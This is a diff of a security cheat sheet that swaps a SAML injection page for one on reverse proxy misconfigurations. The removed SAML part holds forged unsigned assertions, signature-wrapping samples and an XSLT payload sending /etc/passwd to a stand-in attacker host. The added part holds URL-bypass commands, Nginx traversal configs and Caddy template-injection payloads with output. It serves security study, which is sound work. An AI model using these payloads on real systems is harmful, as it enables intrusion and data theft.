@@ -1,200 +1,165 @@
-# SAML Injection
+# Reverse Proxy Misconfigurations
 
-> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.
+> A reverse proxy is a server that sits between clients and backend servers, forwarding client requests to the appropriate server while hiding the backend infrastructure and often providing load balancing or caching. Misconfigurations in a reverse proxy, such as improper access controls, lack of input sanitization in proxy_pass directives, or trusting client-provided headers like X-Forwarded-For, can lead to vulnerabilities like unauthorized access, directory traversal, or exposure of internal resources.
 
 ## Summary
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [Invalid Signature](#invalid-signature)
-    * [Signature Stripping](#signature-stripping)
-    * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
-    * [XML Comment Handling](#xml-comment-handling)
-    * [XML External Entity](#xml-external-entity)
-    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
+    * [HTTP Headers](#http-headers)
+        * [X-Forwarded-For](#x-forwarded-for)
+        * [X-Real-IP](#x-real-ip)
+        * [True-Client-IP](#true-client-ip)
+    * [Nginx](#nginx)
+        * [Off By Slash](#off-by-slash)
+        * [Missing Root Location](#missing-root-location)
+    * [Caddy](#caddy)
+        * [Template Injection](#template-injection)
+* [Labs](#labs)
 * [References](#references)
 
 ## Tools
 
-* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2 Burp Extension.
-* [d0ge/XSW](https://github.com/d0ge/XSW) - XML Signature Wrapping Burp Suite Extensions.
-* [ZAP Addon/SAML Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Allows to detect, show, edit, and fuzz SAML requests.
+* [yandex/gixy](https://github.com/yandex/gixy) - Nginx configuration static analyzer.
+* [MegaManSec/Gixy-Next](https://github.com/MegaManSec/Gixy-Next) - Actively maintained Python3 fork of gixy.
+* [shiblisec/Kyubi](https://github.com/shiblisec/Kyubi) - A tool to discover Nginx alias traversal misconfiguration.
+* [laluka/bypass-url-parser](https://github.com/laluka/bypass-url-parser) - Tool that tests MANY url bypasses to reach a 40X protected page.
+
+    ```ps1
+    bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
+    bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
+    bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
+    ```
 
 ## Methodology
 
-A SAML Response should contain the `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.
+### HTTP Headers
 
-### Invalid Signature
+Since headers like `X-Forwarded-For`, `X-Real-IP`, and `True-Client-IP` are just regular HTTP headers, a client can set or override them if it can control part of the traffic path—especially when directly connecting to the application server, or when reverse proxies are not properly filtering or validating these headers.
 
-Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.
+#### X-Forwarded-For
 
-### Signature Stripping
+`X-Forwarded-For` is an HTTP header used to identify the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.
 
-> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn
+When a client makes a request through a proxy or load balancer, that proxy adds an X-Forwarded-For header containing the client’s real IP address.
 
-The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.
+If there are multiple proxies (a request passes through several), each proxy adds the address from which it received the request to the header, comma-separated.
 
-Example of SAML assertion where `NameID=admin` without signature.
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
-    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
-    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
-        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
-    </saml2p:Status>
-    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
-        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
-        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
-            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
-            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
-                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
-            </saml2:SubjectConfirmation>
-        </saml2:Subject>
-        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
-            <saml2:AudienceRestriction>
-                <saml2:Audience>WLS_SP</saml2:Audience>
-            </saml2:AudienceRestriction>
-        </saml2:Conditions>
-        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
-            <saml2:AuthnContext>
-                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
-            </saml2:AuthnContext>
-        </saml2:AuthnStatement>
-    </saml2:Assertion>
-</saml2p:Response>
+```ps1
+X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
 ```
 
-### XML Signature Wrapping Attacks
+Nginx can override the header with the client's real IP address.
 
-XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.
-
-* **XSW1**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature.
-* **XSW2**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature.
-* **XSW3**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion.
-* **XSW4**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion.
-* **XSW5**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message.
-* **XSW6**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature.
-* **XSW7**: Applies to SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion.
-* **XSW8**: Applies to SAML Assertion messages. Add an “Object” block containing a copy of the original assertion with the signature removed.
-
-In the following example, these terms are used.
-
-* **FA**: Forged Assertion
-* **LA**: Legitimate Assertion
-* **LAS**: Signature of the Legitimate Assertion
-
-```xml
-<SAMLResponse>
-  <FA ID="evil">
-      <Subject>Attacker</Subject>
-  </FA>
-  <LA ID="legitimate">
-      <Subject>Legitimate User</Subject>
-      <LAS>
-         <Reference Reference URI="legitimate">
-         </Reference>
-      </LAS>
-  </LA>
-</SAMLResponse>
+```ps1
+proxy_set_header X-Forwarded-For $remote_addr;
 ```
 
-In the Github Enterprise vulnerability, this request would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.
+#### X-Real-IP
 
-### XML Comment Handling
+`X-Real-IP` is another custom HTTP header, commonly used by Nginx and some other proxies, to forward the original client IP address. Rather than including a chain of IP addresses like X-Forwarded-For, X-Real-IP contains only a single IP: the address of the client connecting to the first proxy.
 
-A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) has multiple CVE in the following libraries and products.
+#### True-Client-IP
 
-* OneLogin - python-saml - CVE-2017-11427
-* OneLogin - ruby-saml - CVE-2017-11428
-* Clever - saml2-js - CVE-2017-11429
-* OmniAuth-SAML - CVE-2017-11430
-* Shibboleth - CVE-2018-0489
-* Duo Network Gateway - CVE-2018-7340
+`True-Client-IP` is a header developed and standardized by some providers, particularly by Akamai, to pass the original client’s IP address through their infrastructure.
 
-Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.
+### Nginx
 
-```xml
-<SAMLResponse>
-    <Issuer>https://idp.com/</Issuer>
-    <Assertion ID="_id1234">
-        <Subject>
-            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
+#### Off By Slash
+
+Nginx matches incoming request URIs against the location blocks defined in your configuration.
+
+* `location /app/` matches requests to `/app/`, `/app/foo`, `/app/bar/123`, etc.
+* `location /app` (no trailing slash) matches `/app*` (i.e., `/application`, `/appfile`, etc.),
+
+This means in Nginx, the presence or absence of a slash in a location block changes the matching logic.
+
+```ps1
+server {
+  location /app/ {
+    # Handles /app/ and anything below, e.g., /app/foo
+  }
+  location /app {
+    # Handles only /app with nothing after OR routes like /application, /appzzz
+  }
+}
 ```
 
-Where `user@user.com` is the first part of the username, and `.evil.com` is the second.
+Example of a vulnerable configuration: An attacker requesting `/styles../secret.txt` resolves to `/path/styles/../secret.txt`
 
-### XML External Entity
-
-An alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not change, except during XML parsing.
-
-In the following example:
-
-* `&s;` will resolve to the string `"s"`
-* `&f1;` will resolve to the string `"f1"`
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE Response [
-  <!ENTITY s "s">
-  <!ENTITY f1 "f1">
-]>
-<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
-  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
-  ID="_04cfe67e596b7449d05755049ba9ec28"
-  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
-  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
-[...]
-  <saml2:Attribute FriendlyName="uid"
-    Name="urn:oid:0.9.2342.19200300.100.1.1"
-    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
-    <saml2:AttributeValue>
-      &s;taf&f1;
-    </saml2:AttributeValue>
-  </saml2:Attribute>
-[...]
-</saml2p:Response>
+```ps1
+location /styles {
+  alias /path/css/;
+}
 ```
 
-The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.
+#### Missing Root Location
 
-### Extensible Stylesheet Language Transformation
+The `root /etc/nginx;` directive sets the server's root directory for static files.
+The configuration doesn't have a root location `/`, it will be set globally set.
+A request to `/nginx.conf` would resolve to `/etc/nginx/nginx.conf`.
 
-An XSLT can be carried out by using the `transform` element.
+```ps1
+server {
+  root /etc/nginx;
 
-![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
-Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)
-
-```xml
-<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
-  ...
-    <ds:Transforms>
-      <ds:Transform>
-        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-          <xsl:template match="doc">
-            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
-            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
-            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
-            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
-            <xsl:value-of select="unparsed-text($exploitUrl)"/>
-          </xsl:template>
-        </xsl:stylesheet>
-      </ds:Transform>
-    </ds:Transforms>
-  ...
-</ds:Signature>
+  location /hello.txt {
+    try_files $uri $uri/ =404;
+    proxy_pass http://127.0.0.1:8080/;
+  }
+}
 ```
+
+### Caddy
+
+#### Template Injection
+
+The provided Caddy web server config uses the `templates` directive, which allows dynamic content rendering with Go templates.
+
+```ps1
+:80 {
+    root * /
+    templates
+    respond "You came from {http.request.header.Referer}"
+}
+```
+
+This tells Caddy to process the response string as a template, and interpolate any variables (using Go template syntax) present in the referenced request header.
+
+In this curl request, the attacker supplied as `Referer` header a Go template expression: `{{readFile "etc/passwd"}}`.
+
+```ps1
+curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
+```
+
+```ps1
+HTTP/1.1 200 OK
+Content-Length: 716
+Content-Type: text/plain; charset=utf-8
+Server: Caddy
+Date: Thu, 24 Jul 2025 08:00:50 GMT
+
+You came from root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+```
+
+Because Caddy is running the templates directive, it will evaluate anything in curly braces inside the context, including things from untrusted input. The `readFile` function is available in Caddy templates, so the attacker's input causes Caddy to actually read `/etc/passwd` and insert its content into the HTTP response.
+
+| Payload                       | Description                   |
+| ----------------------------- | ----------------------------- |
+| `{{env "VAR_NAME"}}`          | Get an environment variable   |
+| `{{listFiles "/"}}`           | List all files in a directory |
+| `{{readFile "path/to/file"}}` | Read a file                   |
+
+## Labs
+
+* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
+* [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
+* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
+* [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)
 
 ## References
 
-* [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - Jem Jensen - March 7, 2017](https://web.archive.org/web/20171113204302/https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
-* [How to Hunt Bugs in SAML; a Methodology - Part I - Ben Risher (@epi052) - March 7, 2019](https://web.archive.org/web/20260119151024/https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
-* [How to Hunt Bugs in SAML; a Methodology - Part II - Ben Risher (@epi052) - March 13, 2019](https://web.archive.org/web/20190511102027/https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
-* [How to Hunt Bugs in SAML; a Methodology - Part III - Ben Risher (@epi052) - March 16, 2019](https://web.archive.org/web/20250619124546/https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
-* [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen - August 23, 2012](https://web.archive.org/web/20130520064525/https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
-* [Oracle Weblogic - Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - July 18, 2018](https://web.archive.org/web/20181221074856/https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
-* [SAML Burp Extension - Roland Bischofberger - July 24, 2015](https://web.archive.org/web/20260213191343/https://blog.compass-security.com/2015/07/saml-burp-extension/)
-* [SAML Security Cheat Sheet - OWASP - February 2, 2019](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
-* [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](https://web.archive.org/web/20170314055835/http://www.economyofmechanism.com/github-saml)
-* [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://web.archive.org/web/20190607070528/https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
-* [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://web.archive.org/web/20180227170113/http://kb.cert.org/vuls/id/475445)
+* [What is X-Forwarded-For and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://web.archive.org/web/20260112224231/https://httptoolkit.com/blog/what-is-x-forwarded-for/)
+* [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://web.archive.org/web/20260227155031/https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
